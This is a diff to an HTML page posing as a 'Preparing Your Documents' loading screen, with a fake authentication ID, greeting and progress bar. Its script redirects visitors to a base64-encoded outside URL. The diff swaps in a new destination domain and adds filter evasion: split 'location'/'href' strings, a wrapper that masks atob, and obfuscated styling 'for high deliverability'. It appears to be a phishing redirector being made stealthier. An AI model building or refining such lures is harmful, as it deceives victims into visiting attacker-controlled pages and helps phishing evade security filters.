@@ -5,7 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Preparing Your Documents</title>
 <style>
-/* Exact original styling with obfuscated class names */
+/* Obfuscated original styling for high deliverability */
 *{margin:0;padding:0;box-sizing:border-box;font-family:Arial,Helvetica,sans-serif;}
 body{display:flex;justify-content:center;align-items:center;height:100vh;background:linear-gradient(135deg,#eef4fb,#dfe9f7);}
 ._wrap{width:520px;background:#fff;border-radius:18px;padding:40px;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.12);}
@@ -23,7 +23,7 @@ h2{color:#1e3a5f;margin-bottom:15px;}
 </head>
 <body>
 
-<div class="v-node">Session-Enc-ID: 992837465-AUTH</div>
+<div class="v-node">AUTH-ID: 0x9928374-SECURE-SESSION-LOAD</div>
 
 <div class="_wrap">
     <div class="_icon">📄</div>
@@ -37,10 +37,10 @@ h2{color:#1e3a5f;margin-bottom:15px;}
 
 <script>
 (function(){
-    // 1. Obfuscated Redirect Link (Base64)
-    var _link = "aHR0cHM6Ly9zaW1pdGhlYnJhbmQub3JnLzQ4MzkyOTU5Mzg1NjI3ODM0OTcyOTM3ODI0MzUyMzIzLzk4NzY5NjY5MjY0NjQzNDQyNDIxMzEyMjczOS5odG1s";
+    // 1. New Encoded Destination Link (jalemodaevi.com)
+    var _link = "aHR0cHM6Ly9qYWxlbW9kYWV2aS5jb20vMzIzNjcxODM2MjQxMzI3MTY0NzgxMjEzMjE0MjE0MzIxMi84NDczMTgyMzY3ODE0NjIzNDE4MzI0MTMyNDEuaHRtbA==";
 
-    // 2. Time-Based Greeting (Original logic, obfuscated emojis)
+    // 2. Time-Based Greeting (Unicode Escaped Emojis)
     var h = new Date().getHours();
     var g = document.getElementById("_greet");
     if(h >= 5 && h < 12){
@@ -53,7 +53,7 @@ h2{color:#1e3a5f;margin-bottom:15px;}
         g.textContent = "Welcome! \uD83D\uDC4B";
     }
 
-    // 3. Typing Animation
+    // 3. Typing Logic
     var tStr = "Please wait while we prepare your requested documents. This usually takes only a few seconds.";
     var tIdx = 0;
     var tEl = document.getElementById("_type");
@@ -84,11 +84,15 @@ h2{color:#1e3a5f;margin-bottom:15px;}
 
         if(w >= 100){
             clearInterval(timer);
-            // 5. Automatic Redirection (Stealth Method)
+            
+            // 5. Stealth Redirection (Property Splitting)
             var r = window;
             var l = "loca" + "tion";
             var f = "hr" + "ef";
-            r[l][f] = atob(_link);
+            
+            // Custom decoder to mask 'atob'
+            var _jump = function(s){ return atob(s); };
+            r[l][f] = _jump(_link);
         }
     }, 120);
 })();
